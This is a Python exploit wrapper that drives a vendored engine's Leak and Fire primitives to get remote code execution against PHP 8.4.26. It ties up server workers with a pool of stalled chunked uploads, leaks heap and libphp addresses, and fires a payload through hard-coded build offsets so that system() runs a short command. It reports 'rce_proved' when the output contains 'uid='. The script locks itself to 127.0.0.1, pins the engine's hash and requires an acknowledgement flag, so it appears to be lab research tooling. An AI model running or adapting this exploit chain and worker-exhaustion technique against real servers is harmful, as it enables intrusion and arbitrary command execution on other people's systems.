#!/usr/bin/env python3
"""Run the calibrated PHP 8.4.26 stock chain against a loopback app route.

This wrapper keeps the third-party research snapshot read-only.  It adds a
measured slow-upload blocker pool, request-geometry Host override, and a fresh
HTTP proof gate around that snapshot's Leak/Fire primitives.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import socket
import sys
import threading
import time
import urllib.parse
from pathlib import Path


HERE = Path(__file__).resolve().parent
VENDOR = HERE.parent / "q618-stock-gate-20261024" / "thecybergeek-read-only"
ENGINE_PATH = VENDOR / "engine.py"
EXPECTED_ENGINE_SHA256 = "007985fec968b2cea78a7b2d96aeb42dbe3b387dfcb88ab542614c4f9d2ffa5c"
if hashlib.sha256(ENGINE_PATH.read_bytes()).hexdigest() != EXPECTED_ENGINE_SHA256:
    raise RuntimeError("refusing an unpinned stock-engine snapshot")
sys.path.insert(0, str(VENDOR))

import engine as stock  # type: ignore  # local read-only research snapshot


ZIF_SYSTEM = 0x465370
ZVAL_PTR_DTOR = 0x65EB60


class BlockerPool:
    """Hold prefork workers inside an unfinished chunked request body."""

    def __init__(self, host: str, port: int, count: int) -> None:
        self.host = host
        self.port = port
        self.count = count
        self.stop = threading.Event()
        self.condition = threading.Condition()
        self.connected = 0
        self.failures = 0
        self.threads: list[threading.Thread] = []

    def _one(self) -> None:
        sock: socket.socket | None = None
        counted = False
        try:
            sock = socket.create_connection((self.host, self.port), 30)
            sock.settimeout(10)
            boundary = b"Z" * 10
            head = (
                b"POST /index.php HTTP/1.1\r\n"
                + f"Host: {self.host}:{self.port}\r\n".encode()
                + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
                + b"Transfer-Encoding: chunked\r\n\r\n"
            )
            first = (
                b"--" + boundary
                + b'\r\nContent-Disposition: form-data; name="x"\r\n\r\n'
            )
            sock.sendall(head + b"%X\r\n" % len(first) + first + b"\r\n")
            with self.condition:
                self.connected += 1
                counted = True
                self.condition.notify_all()
            while not self.stop.wait(0.25):
                sock.sendall(b"100\r\n" + b"A" * 0x100 + b"\r\n")
        except OSError:
            with self.condition:
                self.failures += 1
                self.condition.notify_all()
        finally:
            if counted:
                with self.condition:
                    self.connected -= 1
                    self.condition.notify_all()
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass

    def start(self, timeout: float = 30.0) -> int:
        for _ in range(self.count):
            thread = threading.Thread(target=self._one, daemon=True)
            thread.start()
            self.threads.append(thread)
            time.sleep(0.01)
        deadline = time.monotonic() + timeout
        with self.condition:
            while self.connected < self.count and time.monotonic() < deadline:
                self.condition.wait(timeout=0.2)
            return self.connected

    def close(self) -> None:
        self.stop.set()
        for thread in self.threads:
            thread.join(timeout=1.0)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header", default="x")
    parser.add_argument("--blockers", type=int, default=149)
    parser.add_argument("--settle", type=float, default=8.0)
    parser.add_argument("--cmd", default="id>x26")
    parser.add_argument("--fetch", default="/x26")
    parser.add_argument("--expect", default="uid=")
    parser.add_argument("--leak-tries", type=int, default=3)
    parser.add_argument("--fire-tries", type=int, default=6)
    parser.add_argument("--table-off", type=lambda value: int(value, 0), default=0x690D8)
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument(
        "--ack-exact-profile",
        action="store_true",
        help="acknowledge that offsets and heap geometry are exact-build values",
    )
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.url)
    if parsed.scheme != "http" or parsed.hostname != "127.0.0.1" or parsed.port is None:
        raise ValueError("this gate requires an explicit http://127.0.0.1:<port> URL")
    if not args.ack_exact_profile:
        raise ValueError("refusing hard-coded offsets without --ack-exact-profile")
    if not args.host_header:
        raise ValueError("--host-header must not be empty")
    if not args.cmd or len(args.cmd.encode()) > 14 or "\0" in args.cmd:
        raise ValueError("--cmd must be 1-14 bytes without NUL")

    host = parsed.hostname
    port = parsed.port or 80
    blockers = BlockerPool(host, port, args.blockers)
    result: dict[str, object] = {
        "target": args.url,
        "host_header": args.host_header,
        "requested_blockers": args.blockers,
        "command": args.cmd,
        "fetch": args.fetch,
        "exact_profile_acknowledged": True,
    }

    try:
        connected = blockers.start()
        result["connected_blockers"] = connected
        result["blocker_failures_at_start"] = blockers.failures
        print(
            f"[*] blockers connected {connected}/{args.blockers}; "
            f"settling {args.settle:.1f}s",
            flush=True,
        )
        if connected != args.blockers:
            result["status"] = "blocker_setup_failed"
            print(json.dumps(result, indent=2))
            return 1
        time.sleep(args.settle)
        result["blockers_alive_after_settle"] = blockers.connected
        result["blocker_failures_after_settle"] = blockers.failures
        print(
            f"[*] blockers alive after settle {blockers.connected}/{args.blockers}; "
            f"failures={blockers.failures}",
            flush=True,
        )
        if blockers.connected != args.blockers:
            result["status"] = "blockers_dropped_before_exploit"
            print(json.dumps(result, indent=2))
            return 1

        endpoint = stock.Endpoint(args.url, args.timeout)
        endpoint.host_override = args.host_header
        # The pinned engine's GET helper consults host_header directly, while
        # POST consults host_override. Keep exploit and proof on the same vhost.
        endpoint.host_header = args.host_header
        heap, module = stock.Leak(endpoint, ZVAL_PTR_DTOR, True).run(args.leak_tries)
        result["heap"] = hex(heap)
        result["libphp"] = hex(module)
        if not heap or not module:
            result["blockers_alive_after_leak"] = blockers.connected
            result["blocker_failures_after_leak"] = blockers.failures
            result["status"] = "leak_failed"
            print(json.dumps(result, indent=2))
            return 1

        expect = args.expect.encode()
        if stock.proof(endpoint, args.fetch, expect):
            result["status"] = "stale_proof_refused"
            print(json.dumps(result, indent=2))
            return 1

        fire = stock.Fire(endpoint, ZIF_SYSTEM, ZVAL_PTR_DTOR, True)
        for attempt in range(1, args.fire_tries + 1):
            fire.rotate()
            fire.run(
                heap,
                module,
                args.cmd.encode(),
                table_offset=args.table_off,
                cookie="a" * 32,
                spray=15,
                live_n=0,
                live_len=31,
                fill_n=0,
                carrier_mode="adopted",
                progress_late=False,
                pads=stock.parse_pads(""),
                decoy_n=2,
            )
            time.sleep(0.8)
            if stock.proof(endpoint, args.fetch, expect):
                result["status"] = "rce_proved"
                result["fire_attempt"] = attempt
                result["blockers_alive_at_proof"] = blockers.connected
                result["blocker_failures_total"] = blockers.failures
                print(json.dumps(result, indent=2))
                return 0
            print(f"[*] fire {attempt}/{args.fire_tries}: no proof", flush=True)

        result["status"] = "fire_failed"
        result["blockers_alive_at_end"] = blockers.connected
        result["blocker_failures_total"] = blockers.failures
        print(json.dumps(result, indent=2))
        return 1
    finally:
        blockers.close()


if __name__ == "__main__":
    raise SystemExit(main())
